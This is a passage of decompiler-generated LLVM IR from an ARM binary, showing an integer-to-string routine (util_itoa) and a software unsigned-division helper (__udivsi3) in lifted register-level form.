  %v2_11d88 = load i8, i8* %v1_11d88, align 1
  %v9_11d8c = icmp eq i8 %v2_11d84, %v2_11d88
  br i1 %v9_11d8c, label %dec_label_pc_11d74, label %dec_label_pc_11d98

dec_label_pc_11d98:                               ; preds = %dec_label_pc_11d74, %dec_label_pc_11d7c.preheader, %dec_label_pc_11d84, %bb28
  %storemerge = phi i32 [ 0, %bb28 ], [ 1, %dec_label_pc_11d7c.preheader ], [ 1, %dec_label_pc_11d74 ], [ 0, %dec_label_pc_11d84 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_11d74, { 1, 0 }
  uselistorder i32 %v0_11d78, { 1, 0 }
  uselistorder i32 %v0_11d64, { 3, 0, 1, 2 }
  uselistorder i32 %v1_11d54, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11d20, { 0, 3, 1, 4, 6, 2, 5 }
  uselistorder i8 %v2_11d18, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11d98, { 2, 0, 1, 3 }
  uselistorder label %bb28, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_11dac = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11dac, i32* %r8.global-to-local, align 4
  %v2_11dac = icmp eq i32 %v0_11dac, 0
  store i1 %v2_11dac, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11dac, label %dec_label_pc_11e8c, label %dec_label_pc_11dbc

dec_label_pc_11dbc:                               ; preds = %entry
  %v3_11dbc = icmp eq i8 %arg1, 0
  store i1 %v3_11dbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11dbc, label %.thread, label %dec_label_pc_11dd0

.thread:                                          ; preds = %dec_label_pc_11dbc
  %v4_11dc4 = inttoptr i32 %v0_11dac to i8*
  store i8 48, i8* %v4_11dc4, align 1
  %v0_11dc8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11dc8.pr.pr, label %.thread1, label %dec_label_pc_11dd0

.thread1:                                         ; preds = %.thread
  %v4_11dc8 = load i32, i32* %r8.global-to-local, align 4
  %v5_11dc8 = add i32 %v4_11dc8, 1
  %v6_11dc8 = inttoptr i32 %v5_11dc8 to i8*
  store i8 0, i8* %v6_11dc8, align 1
  %v0_11dcc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11dcc.pr.pr, label %dec_label_pc_11e8c, label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %dec_label_pc_11dbc, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11dd4 = icmp eq i32 %arg2, 10
  store i1 %v7_11dd4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11dd4, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11dd0
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11dd0
  %v4_11dd0 = zext i1 %tmp48 to i32
  store i32 %v4_11dd0, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_11df48 = sub nsw i32 0, %tmp
  %tmp.v3_11df48 = select i1 %phitmp, i32 %tmp, i32 %v3_11df48
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_11df48, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11e00 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11e00, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11e04

dec_label_pc_11e04:                               ; preds = %bb46, %.thread6
  %v2_11e24 = phi i32 [ %v1_11e30, %bb46 ], [ 32, %.thread6 ]
  %v0_11e18 = phi i32 [ %v2_11e28, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_11e08 = load i32, i32* %r6.global-to-local, align 4
  %v3_11e0c = urem i32 %v0_11e18, %v0_11e08
  store i32 %v3_11e0c, i32* %r1.global-to-local, align 4
  %v7_11e10 = icmp eq i32 %v3_11e0c, 9
  store i1 %v7_11e10, i1* %cpsr_z.global-to-local, align 1
  %v1_11e14 = add i32 %v3_11e0c, 48
  store i32 %v0_11e18, i32* %r0.global-to-local, align 4
  %v7_11e1c = icmp sgt i32 %v3_11e0c, 9
  %extract.t = trunc i32 %v1_11e14 to i8
  br i1 %v7_11e1c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11e04
  %v9_11e1c = add i32 %v3_11e0c, 55
  %extract.t28 = trunc i32 %v9_11e1c to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11e04, %bb45
  %v0_11e24.off0 = phi i8 [ %extract.t, %dec_label_pc_11e04 ], [ %extract.t28, %bb45 ]
  store i32 %v0_11e08, i32* %r1.global-to-local, align 4
  %v3_11e24 = load i32, i32* %r7.global-to-local, align 4
  %v4_11e24 = add i32 %v3_11e24, %v2_11e24
  %v5_11e24 = inttoptr i32 %v4_11e24 to i8*
  store i8 %v0_11e24.off0, i8* %v5_11e24, align 1
  %v0_11e28 = load i32, i32* %r0.global-to-local, align 4
  %v1_11e28 = load i32, i32* %r1.global-to-local, align 4
  %v2_11e28 = udiv i32 %v0_11e28, %v1_11e28
  store i32 %v2_11e28, i32* %r0.global-to-local, align 4
  %v2_11e2c = icmp ugt i32 %v1_11e28, %v0_11e28
  store i1 %v2_11e2c, i1* %cpsr_z.global-to-local, align 1
  %v0_11e30 = load i32, i32* %r5.global-to-local, align 4
  %v1_11e30 = add i32 %v0_11e30, -1
  store i32 %v1_11e30, i32* %r5.global-to-local, align 4
  br i1 %v2_11e2c, label %dec_label_pc_11e38, label %dec_label_pc_11e04

dec_label_pc_11e38:                               ; preds = %bb46
  %v0_11e38 = load i32, i32* %sl.global-to-local, align 4
  %v2_11e38 = icmp eq i32 %v0_11e38, 0
  store i1 %v2_11e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e38, label %.thread12, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_11e38
  %v3_11e3c = ptrtoint i32* %stack_var_-32 to i32
  %v3_11e40 = add i32 %v1_11e30, %v3_11e3c
  store i32 %v3_11e40, i32* %r2.global-to-local, align 4
  %v4_11e48 = add i32 %v3_11e40, -34
  %v5_11e48 = inttoptr i32 %v4_11e48 to i8*
  store i8 45, i8* %v5_11e48, align 1
  %v0_11e4c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_11e4c.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v0_11e4c.pr.pr.pr, label %.thread12, label %.thread11._crit_edge

.thread12:                                        ; preds = %.thread11, %dec_label_pc_11e38
  %v1_11e4c = phi i32 [ %v1_11e30, %dec_label_pc_11e38 ], [ %v1_11e4c.pre, %.thread11 ]
  %v2_11e4c = add i32 %v1_11e4c, 1
  store i32 %v2_11e4c, i32* %r5.global-to-local, align 4
  br label %.thread11._crit_edge

.thread11._crit_edge:                             ; preds = %.thread11, %.thread12
  %v1_11e58 = phi i32 [ %v2_11e4c, %.thread12 ], [ %v1_11e4c.pre, %.thread11 ]
  %v0_11e50 = load i32, i32* %r7.global-to-local, align 4
  %v2_11e50 = add i32 %v0_11e50, %v1_11e58
  %v3_11e50 = inttoptr i32 %v2_11e50 to i8*
  %v4_11e50 = load i8, i8* %v3_11e50, align 1
  %v6_11e50 = zext i8 %v4_11e50 to i32
  %v2_11e54 = icmp eq i8 %v4_11e50, 0
  store i1 %v2_11e54, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_11e50, i32* %r2.global-to-local, align 4
  br i1 %v2_11e54, label %dec_label_pc_11e9c, label %dec_label_pc_11e64.preheader

dec_label_pc_11e64.preheader:                     ; preds = %.thread11._crit_edge
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e64.preheader, %dec_label_pc_11e64
  %v0_11e64 = phi i32 [ 0, %dec_label_pc_11e64.preheader ], [ %v1_11e64, %dec_label_pc_11e64 ]
  %v1_11e64 = add i32 %v0_11e64, 1
  store i32 %v1_11e64, i32* %r1.global-to-local, align 4
  %v2_11e68 = add i32 %v1_11e64, %v2_11e50
  %v3_11e68 = inttoptr i32 %v2_11e68 to i8*
  %v4_11e68 = load i8, i8* %v3_11e68, align 1
  %v2_11e6c = icmp eq i8 %v4_11e68, 0
  store i1 %v2_11e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11e6c, label %dec_label_pc_11e74, label %dec_label_pc_11e64

dec_label_pc_11e74:                               ; preds = %dec_label_pc_11e64, %dec_label_pc_11e9c
  %v0_11e7825 = phi i32 [ %v6_11e50, %dec_label_pc_11e9c ], [ %v1_11e64, %dec_label_pc_11e64 ]
  %v0_11e74 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11e78

dec_label_pc_11e78:                               ; preds = %dec_label_pc_11e78.dec_label_pc_11e78_crit_edge, %dec_label_pc_11e74
  %v2_11e84 = phi i32 [ %v5_11e84, %dec_label_pc_11e78.dec_label_pc_11e78_crit_edge ], [ %v0_11e74, %dec_label_pc_11e74 ]
  %v0_11e7c = phi i32 [ %v0_11e7c.pre, %dec_label_pc_11e78.dec_label_pc_11e78_crit_edge ], [ %v2_11e50, %dec_label_pc_11e74 ]
  %v0_11e78 = phi i32 [ %v0_11e78.pre, %dec_label_pc_11e78.dec_label_pc_11e78_crit_edge ], [ %v0_11e7825, %dec_label_pc_11e74 ]
  %v1_11e78 = add i32 %v0_11e78, -1
  store i32 %v1_11e78, i32* %r1.global-to-local, align 4
  %v1_11e7c = inttoptr i32 %v0_11e7c to i8*
  %v2_11e7c = load i8, i8* %v1_11e7c, align 1
  %v5_11e7c = add i32 %v0_11e7c, 1
  store i32 %v5_11e7c, i32* %r2.global-to-local, align 4
  %v3_11e80 = icmp eq i32 %v0_11e78, 0
  store i1 %v3_11e80, i1* %cpsr_z.global-to-local, align 1
  %v3_11e84 = inttoptr i32 %v2_11e84 to i8*
  store i8 %v2_11e7c, i8* %v3_11e84, align 1
  %v4_11e84 = load i32, i32* %r0.global-to-local, align 4
  %v5_11e84 = add i32 %v4_11e84, 1
  store i32 %v5_11e84, i32* %r0.global-to-local, align 4
  br i1 %v3_11e80, label %dec_label_pc_11e8c, label %dec_label_pc_11e78.dec_label_pc_11e78_crit_edge

dec_label_pc_11e78.dec_label_pc_11e78_crit_edge:  ; preds = %dec_label_pc_11e78
  %v0_11e78.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_11e7c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11e78

dec_label_pc_11e8c:                               ; preds = %dec_label_pc_11e78, %.thread1, %entry
  %v0_11e8c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_11e8c, i32* %r0.global-to-local, align 4
  ret i32 %v0_11e8c

dec_label_pc_11e9c:                               ; preds = %.thread11._crit_edge
  store i32 %v6_11e50, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11e74

; uselistorder directives
  uselistorder i32 %v5_11e84, { 1, 0 }
  uselistorder i1 %v3_11e80, { 1, 0 }
  uselistorder i32 %v0_11e7c, { 1, 0 }
  uselistorder i32 %v1_11e64, { 0, 1, 3, 2 }
  uselistorder i32 %v6_11e50, { 1, 0 }
  uselistorder i32 %v2_11e50, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11e4c.pre, { 1, 0 }
  uselistorder i32 %v1_11e30, { 1, 0, 3, 2 }
  uselistorder i32 %v2_11e28, { 1, 0 }
  uselistorder i32 %v3_11e0c, { 0, 2, 1, 3, 4 }
  uselistorder i1 %phitmp, { 2, 1, 0 }
  uselistorder i32 %v0_11dac, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 6, 7, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 11, 10, 12, 13 }
  uselistorder i8 45, { 1, 0 }
  uselistorder i32 55, { 9, 0, 8, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder label %dec_label_pc_11e74, { 1, 0 }
  uselistorder label %dec_label_pc_11e64, { 1, 0 }
  uselistorder label %.thread11._crit_edge, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_11dd0, { 2, 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_11ea4 = load i32, i32* @r1, align 4
  %v1_11ea4 = add i32 %v0_11ea4, -1
  store i32 %v1_11ea4, i32* %r2.global-to-local, align 4
  %v2_11ea4 = icmp eq i32 %v0_11ea4, 0
  %v7_11ea4 = icmp eq i32 %v0_11ea4, 1
  %v0_11ea8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_11ea4, i32 %v0_11ea8)
  br i1 %v2_11ea4, label %dec_label_pc_11f8c, label %dec_label_pc_11eb0

dec_label_pc_11eb0:                               ; preds = %entry
  %v0_11eb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11eb0 = load i32, i32* @r1, align 4
  %tmp = icmp ugt i32 %v0_11eb0, %v1_11eb0
  br i1 %tmp, label %dec_label_pc_11eb8, label %dec_label_pc_11f44

dec_label_pc_11eb8:                               ; preds = %dec_label_pc_11eb0
  %v1_11eb8 = load i32, i32* %r2.global-to-local, align 4
  %v2_11eb8 = and i32 %v1_11eb8, %v1_11eb0
  %v4_11eb8 = icmp eq i32 %v2_11eb8, 0
  br i1 %v4_11eb8, label %dec_label_pc_11f50, label %dec_label_pc_11ec0

dec_label_pc_11ec0:                               ; preds = %dec_label_pc_11eb8
  %v3_11ec0 = icmp ult i32 %v1_11eb0, 536870912
  br i1 %v3_11ec0, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11ec0
  %v4_11ec4 = mul i32 %v1_11eb0, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11ec0, %.thread
  %v0_11ee4.pr36.ph = phi i32 [ %v4_11ec4, %.thread ], [ %v1_11eb0, %dec_label_pc_11ec0 ]
  %storemerge133 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11ec0 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb81
  %v0_11ee4.pr36 = phi i32 [ %v4_11ed8, %bb81 ], [ %v0_11ee4.pr36.ph, %.preheader.preheader ]
  %v1_11edc = phi i32 [ %v4_11edc, %bb81 ], [ %storemerge133, %.preheader.preheader ]
  %v2_11ed0 = icmp ugt i32 %v0_11ee4.pr36, 268435455
  br i1 %v2_11ed0, label %.thread2, label %bb

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_11ee4thread-pre-split.loopexit

bb:                                               ; preds = %.preheader
  %v4_11ed4 = icmp ult i32 %v0_11ee4.pr36, %v0_11eb0
  br i1 %v4_11ed4, label %bb80, label %dec_label_pc_11ee4thread-pre-split.loopexit.loopexit

bb80:                                             ; preds = %bb
  %v2_11ed8 = and i32 %v0_11ee4.pr36, 268435456
  %v3_11ed8 = icmp eq i32 %v2_11ed8, 0
  %v4_11ed8 = mul i32 %v0_11ee4.pr36, 16
  br i1 %v3_11ed8, label %bb81, label %dec_label_pc_11ee4.loopexit

bb81:                                             ; preds = %bb80
  %v2_11edc = and i32 %v1_11edc, 268435456
  %v3_11edc = icmp eq i32 %v2_11edc, 0
  %v4_11edc = mul i32 %v1_11edc, 16
  br i1 %v3_11edc, label %.preheader, label %dec_label_pc_11ee4thread-pre-split.loopexit.loopexit

dec_label_pc_11ee4thread-pre-split.loopexit.loopexit: ; preds = %bb81, %bb
  %v1_11ef048.ph = phi i32 [ %v1_11edc, %bb ], [ %v4_11edc, %bb81 ]
  %v0_11ee4.pr38.ph = phi i32 [ %v0_11ee4.pr36, %bb ], [ %v4_11ed8, %bb81 ]
  br label %dec_label_pc_11ee4thread-pre-split.loopexit

dec_label_pc_11ee4thread-pre-split.loopexit:      ; preds = %dec_label_pc_11ee4thread-pre-split.loopexit.loopexit, %.thread2
  %v1_11ef048 = phi i32 [ %v1_11edc, %.thread2 ], [ %v1_11ef048.ph, %dec_label_pc_11ee4thread-pre-split.loopexit.loopexit ]
  %v0_11ee4.pr38 = phi i32 [ %v0_11ee4.pr36, %.thread2 ], [ %v0_11ee4.pr38.ph, %dec_label_pc_11ee4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_11ee4thread-pre-split

dec_label_pc_11ee4thread-pre-split:               ; preds = %dec_label_pc_11ee4thread-pre-split.loopexit, %bb83
  %v1_11ef046 = phi i32 [ %v1_11ef048, %dec_label_pc_11ee4thread-pre-split.loopexit ], [ %v3_11ef0, %bb83 ]
  %v0_11ee4.pr = phi i32 [ %v0_11ee4.pr38, %dec_label_pc_11ee4thread-pre-split.loopexit ], [ %v3_11eec, %bb83 ]
  br label %dec_label_pc_11ee4

dec_label_pc_11ee4.loopexit:                      ; preds = %bb80
  br label %dec_label_pc_11ee4

dec_label_pc_11ee4:                               ; preds = %dec_label_pc_11ee4.loopexit, %dec_label_pc_11ee4thread-pre-split
  %v1_11ef0 = phi i32 [ %v1_11ef046, %dec_label_pc_11ee4thread-pre-split ], [ %v1_11edc, %dec_label_pc_11ee4.loopexit ]
  %v1_11eec = phi i32 [ %v0_11ee4.pr, %dec_label_pc_11ee4thread-pre-split ], [ %v4_11ed8, %dec_label_pc_11ee4.loopexit ]
  %v2_11ee4 = icmp slt i32 %v1_11eec, 0
  br i1 %v2_11ee4, label %dec_label_pc_11ef8, label %bb82

bb82:                                             ; preds = %dec_label_pc_11ee4
  %v4_11ee8 = icmp ult i32 %v1_11eec, %v0_11eb0
  br i1 %v4_11ee8, label %bb83, label %dec_label_pc_11ef8

bb83:                                             ; preds = %bb82
  %v3_11eec = mul i32 %v1_11eec, 2
  %v2_11ef0 = icmp slt i32 %v1_11ef0, 0
  %v3_11ef0 = mul i32 %v1_11ef0, 2
  br i1 %v2_11ef0, label %dec_label_pc_11ef8, label %dec_label_pc_11ee4thread-pre-split

dec_label_pc_11ef8:                               ; preds = %bb82, %dec_label_pc_11ee4, %bb83
  %v2_11f0459 = phi i32 [ %v3_11ef0, %bb83 ], [ %v1_11ef0, %bb82 ], [ %v1_11ef0, %dec_label_pc_11ee4 ]
  %v1_11efc51 = phi i32 [ %v3_11eec, %bb83 ], [ %v1_11eec, %bb82 ], [ %v1_11eec, %dec_label_pc_11ee4 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11efc

dec_label_pc_11efc:                               ; preds = %.thread11, %dec_label_pc_11ef8
  %v1_11f30 = phi i32 [ %v4_11f30, %.thread11 ], [ %v2_11f0459, %dec_label_pc_11ef8 ]
  %v1_11f04 = phi i32 [ %v0_11f3c, %.thread11 ], [ 0, %dec_label_pc_11ef8 ]
  %v1_11f34 = phi i32 [ %v4_11f34, %.thread11 ], [ %v1_11efc51, %dec_label_pc_11ef8 ]
  %v1_11f00 = phi i32 [ %v0_11f2c, %.thread11 ], [ %v0_11eb0, %dec_label_pc_11ef8 ]
  %v3_11efc = icmp ult i32 %v1_11f00, %v1_11f34
  br i1 %v3_11efc, label %.thread7, label %bb84

bb84:                                             ; preds = %dec_label_pc_11efc
  %v3_11f00 = sub i32 %v1_11f00, %v1_11f34
  store i32 %v3_11f00, i32* %r0.global-to-local, align 4
  %v3_11f04 = or i32 %v1_11f04, %v1_11f30
  store i32 %v3_11f04, i32* %r2.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_11efc, %bb84
  %v1_11f0c = phi i32 [ %v1_11f00, %dec_label_pc_11efc ], [ %v3_11f00, %bb84 ]
  %v1_11f10 = phi i32 [ %v1_11f04, %dec_label_pc_11efc ], [ %v3_11f04, %bb84 ]
  %v4_11f08 = udiv i32 %v1_11f34, 2
  %v6_11f08 = icmp ult i32 %v1_11f0c, %v4_11f08
  br i1 %v6_11f08, label %.thread8, label %bb85

bb85:                                             ; preds = %.thread7
  %v3_11f0c = urem i32 %v1_11f34, 2
  %v4_11f0c = icmp eq i32 %v3_11f0c, 0
  %v6_11f0c = sub i32 %v1_11f0c, %v4_11f08
  store i32 %v6_11f0c, i32* %r0.global-to-local, align 4
  br i1 %v4_11f0c, label %.thread8, label %bb86

bb86:                                             ; preds = %bb85
  %v5_11f10 = udiv i32 %v1_11f30, 2
  %v6_11f10 = or i32 %v1_11f10, %v5_11f10
  store i32 %v6_11f10, i32* %r2.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %bb85, %.thread7, %bb86
  %v1_11f18 = phi i32 [ %v6_11f0c, %bb85 ], [ %v1_11f0c, %.thread7 ], [ %v6_11f0c, %bb86 ]
  %v1_11f1c = phi i32 [ %v1_11f10, %bb85 ], [ %v1_11f10, %.thread7 ], [ %v6_11f10, %bb86 ]
  %v4_11f14 = udiv i32 %v1_11f34, 4
  %v6_11f14 = icmp ult i32 %v1_11f18, %v4_11f14
  br i1 %v6_11f14, label %.thread9, label %bb87

bb87:                                             ; preds = %.thread8
  %v3_11f18 = and i32 %v1_11f34, 2
  %v4_11f18 = icmp eq i32 %v3_11f18, 0
  %v6_11f18 = sub i32 %v1_11f18, %v4_11f14
  store i32 %v6_11f18, i32* %r0.global-to-local, align 4
  br i1 %v4_11f18, label %.thread9, label %bb88

bb88:                                             ; preds = %bb87
  %v5_11f1c = udiv i32 %v1_11f30, 4
  %v6_11f1c = or i32 %v1_11f1c, %v5_11f1c
  store i32 %v6_11f1c, i32* %r2.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %bb87, %.thread8, %bb88
  %v1_11f24 = phi i32 [ %v6_11f18, %bb87 ], [ %v1_11f18, %.thread8 ], [ %v6_11f18, %bb88 ]
  %v1_11f28 = phi i32 [ %v1_11f1c, %bb87 ], [ %v1_11f1c, %.thread8 ], [ %v6_11f1c, %bb88 ]
  %v4_11f20 = udiv i32 %v1_11f34, 8
  %v6_11f20 = icmp ult i32 %v1_11f24, %v4_11f20
  br i1 %v6_11f20, label %thread-pre-split, label %bb89

bb89:                                             ; preds = %.thread9
  %v3_11f24 = and i32 %v1_11f34, 4
  %v4_11f24 = icmp eq i32 %v3_11f24, 0
  %v6_11f24 = sub i32 %v1_11f24, %v4_11f20
  store i32 %v6_11f24, i32* %r0.global-to-local, align 4
  br i1 %v4_11f24, label %thread-pre-split, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11f28 = udiv i32 %v1_11f30, 8
  %v6_11f28 = or i32 %v1_11f28, %v5_11f28
  store i32 %v6_11f28, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_11f3c = phi i32 [ %v1_11f28, %bb89 ], [ %v1_11f28, %.thread9 ], [ %v6_11f28, %bb90 ]
  %v0_11f2c = phi i32 [ %v6_11f24, %bb89 ], [ %v1_11f24, %.thread9 ], [ %v6_11f24, %bb90 ]
  %v2_11f2c = icmp eq i32 %v0_11f2c, 0
  br i1 %v2_11f2c, label %dec_label_pc_11f3c, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_11f30, 16
  br i1 %tmp138, label %dec_label_pc_11f3c, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_11f30 = udiv i32 %v1_11f30, 16
  %v4_11f34 = udiv i32 %v1_11f34, 16
  br label %dec_label_pc_11efc

dec_label_pc_11f3c:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_11f3c, i32* %r0.global-to-local, align 4
  ret i32 %v0_11f3c

dec_label_pc_11f44:                               ; preds = %dec_label_pc_11eb0
  %v9_11eb0 = icmp eq i32 %v0_11eb0, %v1_11eb0
  %. = zext i1 %v9_11eb0 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_11f50:                               ; preds = %dec_label_pc_11eb8
  %v2_11f50 = icmp ugt i32 %v1_11eb0, 65535
  br i1 %v2_11f50, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_11f50
  %v2_11f54 = and i32 %v1_11eb0, 32768
  %v3_11f54 = icmp eq i32 %v2_11f54, 0
  %v4_11f54 = udiv i32 %v1_11eb0, 65536
  br i1 %v3_11f54, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_11f50
  %v0_11f6065 = phi i32 [ %v1_11eb0, %dec_label_pc_11f50 ], [ %v4_11f54, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_11f64 = phi i32 [ %v0_11f6065, %.thread16 ], [ %v4_11f54, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_11f60 = icmp ugt i32 %v1_11f64, 255
  br i1 %v2_11f60, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_11f64 = and i32 %v1_11f64, 128
  %v3_11f64 = icmp eq i32 %v2_11f64, 0
  %v4_11f64 = udiv i32 %v1_11f64, 256
  br i1 %v3_11f64, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_11f68 = or i32 %storemerge, 8
  store i32 %v2_11f68, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_11f74 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_11f68, %bb98 ]
  %v1_11f70 = phi i32 [ %v1_11f64, %bb96 ], [ %v4_11f64, %bb97 ], [ %v4_11f64, %bb98 ]
  %v2_11f6c = icmp ugt i32 %v1_11f70, 15
  br i1 %v2_11f6c, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_11f70 = and i32 %v1_11f70, 8
  %v3_11f70 = icmp eq i32 %v2_11f70, 0
  %v4_11f70 = udiv i32 %v1_11f70, 16
  br i1 %v3_11f70, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11f74 = add nsw i32 %v1_11f74, 4
  store i32 %v2_11f74, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_11f7c = phi i32 [ %v1_11f74, %.thread17 ], [ %v1_11f74, %bb99 ], [ %v2_11f74, %bb100 ]
  %v5_11f80 = phi i32 [ %v1_11f70, %.thread17 ], [ %v4_11f70, %bb99 ], [ %v4_11f70, %bb100 ]
  %v2_11f78 = icmp ugt i32 %v5_11f80, 3
  %v7_11f78 = icmp eq i32 %v5_11f80, 4
  %v2_11f7c = xor i1 %v7_11f78, true
  %v3_11f7c = and i1 %v2_11f78, %v2_11f7c
  br i1 %v3_11f7c, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_11f7c = add nsw i32 %v4_11f7c, 3
  store i32 %v5_11f7c, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_11f80 = phi i32 [ %v4_11f7c, %.thread18 ], [ %v5_11f7c, %bb101 ]
  %v2_11f80 = xor i1 %v2_11f78, true
  %v3_11f80 = or i1 %v7_11f78, %v2_11f80
  br i1 %v3_11f80, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_11f80 = udiv i32 %v5_11f80, 2
  %v9_11f80 = add i32 %v4_11f80, %v8_11f80
  store i32 %v9_11f80, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_11f84 = phi i32 [ %v4_11f80, %bb102 ], [ %v9_11f80, %bb103 ]
  %v6_11f84 = lshr i32 %v0_11eb0, %v1_11f84
  store i32 %v6_11f84, i32* %r0.global-to-local, align 4
  ret i32 %v6_11f84

dec_label_pc_11f8c:                               ; preds = %entry
  %v0_11f90 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11f80, { 1, 0 }
  uselistorder i1 %v7_11f78, { 1, 0 }
